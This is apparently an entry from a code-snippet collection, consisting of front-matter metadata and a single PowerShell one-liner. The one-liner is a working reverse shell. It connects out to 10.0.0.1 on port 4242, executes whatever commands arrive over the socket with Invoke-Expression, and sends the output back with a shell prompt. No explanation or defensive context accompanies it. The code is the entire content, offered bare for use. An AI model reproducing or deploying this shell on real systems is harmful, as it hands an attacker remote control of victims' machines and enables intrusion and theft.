---
id: a46d67e4-dd7c-4c00-97da-9ed3f1f6f8a5
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.477942+00:00'
updated_at: '2023-04-10T20:25:24.913319+00:00'
---

# Code Snippet a46d67e4

**Language**: Powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


